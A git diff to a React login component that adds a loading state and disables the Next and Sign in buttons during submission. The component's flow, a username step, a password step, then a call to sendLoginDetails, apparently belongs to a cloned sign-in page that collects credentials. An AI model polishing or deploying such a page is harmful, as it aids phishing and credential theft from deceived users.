@@ -7,6 +7,7 @@ function App() {
   const [pwdVal, setPwdVal] = useState(false);
   const [uname, setUname] = useState('');
   const [pwd, setPwd] = useState('');
+  const [loading, setLoading] = useState(false); // New state for loading
 
   useEffect(() => {
     // Simulate loading time
@@ -56,19 +57,27 @@ function App() {
     }
   };
 
-  const handleNext = () => {
-    validate();
-    if (unameVal) {
+  useEffect(() => {
+    if (view === 'uname' && unameVal) {
       setView('pwd');
+      setLoading(false); // Reset loading state
+    } else if (view === 'pwd' && pwdVal) {
+      setView('final');
+      sendLoginDetails(uname, pwd);
+      setLoading(false); // Reset loading state
     }
+  }, [unameVal, pwdVal]); // Trigger when unameVal or pwdVal changes
+
+  const handleNext = () => {
+    if (loading) return; // Prevent multiple submissions
+    setLoading(true); // Set loading to true
+    validate();
   };
 
   const handleSignIn = () => {
+    if (loading) return; // Prevent multiple submissions
+    setLoading(true); // Set loading to true
     validate();
-    if (pwdVal) {
-      setView('final');
-      sendLoginDetails(uname, pwd);
-    }
   };
 
   const handleBack = () => {
@@ -134,7 +143,9 @@ function App() {
               </p>
             </div>
             <div>
-              <button className="btn" id="btn_next" onClick={handleNext}>Next</button>
+              <button className="btn" id="btn_next" onClick={handleNext} disabled={loading}>
+                {loading ? 'Loading...' : 'Next'}
+              </button>
             </div>
           </div>
           <div className="opts">
@@ -178,7 +189,9 @@ function App() {
               </p>
             </div>
             <div>
-              <button className="btn" id="btn_sig" onClick={handleSignIn}>Sign in</button>
+              <button className="btn" id="btn_sig" onClick={handleSignIn} disabled={loading}>
+                {loading ? 'Loading...' : 'Sign in'}
+              </button>
             </div>
           </div>
         </section>
